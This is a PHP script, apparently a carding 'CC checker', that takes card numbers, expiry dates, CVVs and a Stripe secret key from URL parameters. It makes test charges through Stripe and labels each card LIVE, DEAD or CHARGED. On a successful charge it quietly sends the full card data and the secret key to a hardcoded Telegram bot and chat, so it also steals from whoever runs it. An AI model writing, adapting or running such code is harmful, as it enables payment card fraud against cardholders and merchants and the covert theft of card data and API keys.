<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
	$amt = '1';
	$chr = $amt * 100;
}
$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";





//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');  

$result1 = curl_exec($ch);  

$tok1 = Getstr($result1,'"id": "','"');  

$msg = Getstr($result1,'"message": "','"');  

//echo "<br><b>Result1: </b> $result1<br>";  

if (strpos($result1, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}

#-------------------[2nd REQ]--------------------#

$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  

$result2 = curl_exec($ch);  

$tok2 = Getstr($result2,'"id": "','"');  

$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  

//echo "<br><b>Result2: </b> $result2<br>";  

if (strpos($result2, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}



// ---------------------------------------------------- Hit To Telegram Start----------------------------
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('6190237258:AAHUvG8uS3ezcg2bOjd3_Za0YKlkF_ErE0M');
$chatID = urlencode('-1001989435427');

$charged_message = "CC:$lista\r\n➤ SK Key:$sk\r\n";

$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text=' . urlencode($charged_message) . '';

$max_retries = 1;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;
// ---------------------------------------------------- Hit To Telegram End-------------------------------

//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
  
    echo '<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>'.$lista.'</b></font> <font class="text-white">
    <br>
    ➤ Response: $'.$amt.' CCN Charged ✅
    <br>
    ➤ Receipt: <span style="color: green;" class="badge"><a href="' . $receipturl . '"  target="_blank"><b>Here</b></a></span>
    <br>
    ➤ Checked from: <b>' . $domain . '</b></font><br>';
    while (!$sendchargedtotg && $num_retries < $max_retries) {
        $sendchargedtotg = @file_get_contents($sendcharged);
        $num_retries++;
    }
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}


elseif(strpos($result1, "generic_decline")) {
    echo '<font color=red><b>DEAD [ Generic_Decline ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo '<font color=red><b>DEAD [ Generic_Decline ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo "<font color=#0ec9e7><b>LIVE [ Insufficient_Funds ]<br> $lista<br>";
}

elseif(strpos($result2, "fraudulent" )) {
    echo '<font color=red><b>DEAD [FRAUDULENT ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '<font color=red><b>DEAD [ DO NOT HONO ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '<font color=red><b>DEAD [ DO NOT HONO ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<font color=red><b>DEAD [ FRAUDULENT ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo "<font color=#0ec9e7><b>LIVE [ Security code is incorrect ]<br> $lista<br>";
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo "<font color=#0ec9e7><b>LIVE [ Security code is incorrect ]<br> $lista<br>";
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY checker</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<font color=red><b>DEAD [ CARD DECLINED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result1, "do_not_honor")) {
    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '<font color=red><b>DEAD [ Generic_Decline ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<font color=red><b>DEAD [ CARD DECLINED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font color=red><b>DEAD [ CVC_UNCHECKED : INFORM AT OWNER ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<font color=red><b>DEAD [ CVC_UNCHECKED : INFORM AT OWNER ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
    echo '<font color=red><b>DEAD [ CURRENCY NOT SUPORTED TRY IN INR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<font color=red><b>DEAD [ CARD NOT SUPPORT THIS TYPE OF PURCHASE]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '<font color=red><b>DEAD [ FRAUDULENT]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '<font color=red><b>DEAD [ testmode_charges_only ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '<font color=red><b>DEAD [SK KEY REVOKED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '<font color=red><b>DEAD [ENTER CC TO CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '<font color=red><b>DEAD [ CARD NOT SUPPORTED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}
else {
    echo '<font color=red><b>DEAD [ INCREASE AMOUNT OR TRY ANOTHER CARD ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
}



//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//echo "<b>Reason:</b> $reason<br>";
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";
//echo "<br><b>Result3: </b> $result2<br>";

curl_close($ch);
ob_flush();
?>